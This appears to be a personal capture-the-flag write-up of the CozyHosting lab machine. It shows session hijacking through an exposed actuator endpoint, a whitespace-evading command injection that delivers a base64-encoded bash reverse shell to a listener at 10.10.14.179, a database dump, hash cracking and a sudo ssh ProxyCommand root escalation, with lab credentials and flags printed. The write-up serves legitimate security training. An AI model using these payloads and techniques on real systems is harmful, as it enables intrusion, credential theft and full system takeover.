## Reconnaissance

- Tried to hit it with a webbrowser and the default page redirected to cozyhosting.htb
- Added that to my hosts file and refreshed the page
- Nothing much on the page except a login
- Ran `dirsearch -u http://cozyhosting.htb`
- Found the following
![[Screenshot 2023-12-08 at 9.54.21 pm.png|Screenshot 2023-12-08 at 9.54.21 pm.png]]
- Browsed to /actuator and gave a list of what looks like sessions
- Browsed to /actuator/sessions
- Found this 
	- `{"9D349761064F219907F86799A94695D9":"kanderson"
- This looks like an authenticated session
- Opened up Burpsuit and browsed back to actuator to get a better look. Definitely authenticated sessions

- If I go to the http://cozyhosting.htb/admin page and enter the username kanderson and a random password it rejects it but I now have the request.

## Weaponisation

- I can now manipulate the sessionid to hopefully get into the administration page.
- So I turn on interception and inject the authenticated sessionid into the request at each step and bingo I'm in.

- Looking around and the area of most interest is at the bottom of the screen. It's a form that accepts a Hostname and a Username. 
- It also mentions authorised_keys files so this must be something to do with ssh.
- If I enter a hostname of localhost and username it is sending a POST command to /executessh and complains that the Host Key verification has failed. 
- This looks promising so I send this over to repeater to start some further enumeration

## Exploitation

- If I remove both the hostname and the username it complains about an Invalid Hostname
![[Screenshot 2023-12-08 at 9.41.52 pm.png]]

- If I enter the hostname but leave the username empty I get the output from the ssh command when no parameters are specified. So this endpoint is running a local command that includes the username and hostname. It is likely `ssh <username>@<hostname>` or something similar.

- This could be open to a command line injection attack. 
- There appears to be some data verification on the username field. It won't allow whitespaces. So we'll need to use URL encoding to utilise this. 
- This part was beyond my current skill level so required some prompting from guides. 
- To get around the whitespace restriction we'll use the Input Field Separator (IFS) along with encoding our commands with base 64 so that there are no special characters that we have to deal with. 
- Firstly we'll confirm that things work like I think they will. 
- I issue the command `;sleep${IFS}5;#`. This does as expected and delays the response by 5 secconds.

## Installation

- So now I need to generate a payload that I can send to pop a reverse shell
- I use the following command to encode my reverse shell command with base 64
	- `echo "bash -i >& /dev/tcp/10.10.14.179/4242 0>&1" | base64 -w 0`
- I then craft the following line that will be URL encoded and sent to the target
```
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzkvNDI0MiAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
``` 
- I then throw that into repeater and use burp to encode the URL

![[Screenshot 2023-12-08 at 10.00.16 pm.png]]
- That gives me the following command
```
host=localhost&username=%3becho${IFS%25%3f%3f}"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xNzkvNDI0MiAwPiYxCg%3d%3d"${IFS%25%3f%3f}|${IFS%25%3f%3f}base64${IFS%25%3f%3f}-d${IFS%25%3f%3f}|${IFS%25%3f%3f}bash%3b
```

![[Screenshot 2023-12-08 at 10.00.26 pm.png]]

- The final step is to start up a listener with
	- `nc -lvnp 4242`
- Then send the request to the target and we're now in
![[Screenshot 2023-12-08 at 10.03.49 pm.png]]
- Before we do anything we'll upgrade the shell so that it's fully interactive and stable

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
ctrl + z
stty raw -echo; fg
```

## Actions on Objective

- The first thing we find is a jar file (cloudhosting-0.0.1. Jar) so I download that to look at.
- Further enumeration reveals postgresql is running on the server as well as Nginx.
- There's a /home/josh folder but I don't have access to it.
- There are also no sudo commands that can be run without a password. 
- I can't find any files that relate to DB Credentials and assuming that the Website is utilising a DB then my next port of call is to get access to the DB. 
- However, I attempt to run the jar file to see what happens and it appears to be the application running the Cloudhosting website so we'll take a look at that.

- Once again I'm not familiar with JAR files so I deferred to the guides and they opened the file with jd-gui. 
- I also extracted the jar with unzip but the files are compiled classes so you can't view them that way. 
- I tried searching for passwords and usernames but not being familiar with the structure of a java app I was lost. 
- They were actually located in:
	- BOOT-INF --> classes --> applilcation.properties
- I was able to recover the DB Credentials
	- Database: cozyhosting
	- Username: postgres
	- Password: Vg&nvzAQ7XxR
![[Screenshot 2023-12-08 at 10.27.43 pm.png]]

- The java file listed the database as POSTGRESQL but that didn't work when I tried to dump the DB. 
- So I connected to the PostgreSQL server using the following
	- `pgsql -U postgres -W -h localhost`
- I then listed all the databases with `\l` and the DB I was after was called cozyhosting
- So I exited out of pgsql and then used the pg_dump to dump the DB
	- `pg_dump -U postgres -W -h localhost -d cozyhosting > dump`
- Sifting through the dump file I found some user account password hashes

```
anderson:$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim:User
admin:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:Admin
```

- I pulled these back and ran John the Ripper with the following command:
	- `john --wordlist=~/01.\ Tools/Wordlists/rockyou.txt hashes `
- Recovered the admin password: **manchesterunited**
- In case they've reused passwords I tried to ssh in using josh and the recovered password
	- `ssh josh@10.10.11.230`
- It worked and I was able to recover the user flag
	- `a8e773864da966dbae96019c7c4cf1bc`
- Some quick enumeration turns up that Josh can run ssh as sudo
![[Screenshot 2023-12-08 at 11.11.27 pm.png]]
- GTFO Bins has an easy payload that will pop a root shell using SSH
	- `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
- I ran that and was able to recover the root flag
